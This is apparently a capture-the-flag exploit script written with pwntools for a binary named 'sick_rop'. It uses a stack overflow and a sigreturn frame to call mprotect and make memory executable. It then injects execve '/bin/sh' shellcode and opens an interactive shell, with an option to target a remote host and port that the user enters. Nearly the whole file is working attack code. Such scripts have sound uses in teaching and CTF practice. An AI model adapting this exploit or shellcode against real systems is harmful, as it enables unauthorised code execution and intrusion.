#!/usr/bin/env python
# Developed by Mason Soroka-Gill https://github.com/SOROM2

from pwn import *
from pprint import pprint

exe = context.binary = ELF('./sick_rop', checksec=False)
context.terminal = ['tmux', 'splitw', '-hb']

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        host = input("Enter target host: ").strip()
        port = int(input("Enter target port: "))
        return remote(host, port)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *vuln+32
c
'''.format(**locals())

offset = 40
rop = ROP(exe)

# let pwntools set up some symbols
vuln = p64(exe.symbols['vuln'])
syscall = p64(rop.syscall.address)
ret = p64(rop.ret.address)

# execve /bin/sh
shellcode = b'\x48\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

# sets up sigreturn frame to execute an mprotect syscall
frame = SigreturnFrame(arch='amd64')
frame.rax = 0xa                 # sys_mprotect
frame.rdi = exe.symbols['read'] # read function pointer
frame.rsi = len(shellcode)      # amount of memory to change protection
frame.rdx = 0x7                 # set to rwx
frame.rsp = 0x4010f0
frame.rip = rop.syscall.address # call mprotect
frame = bytes(frame)

# call sigreturn
payload_sigret = b"".join([
    b"X" * offset,
    vuln,               # read() length of input sets rax
    syscall,            # execute the sys_rt_sigreturn
    frame
])

# execute shellcode
payload_shell = b"".join([
    b"X" * offset,
	p64(0x4010f8),  # add [rax],al
	shellcode,
    b"\n"
])

io = start()

# set up stack for sigreturn
io.sendline(payload_sigret)
io.recv(len(payload_sigret))
io.send(b"N"*0xf) # set rax 0xf sys_rt_sigreturn
io.recv(0xf)

# ret into shellcode
io.send(payload_shell)
io.recv(len(payload_shell))

io.interactive()

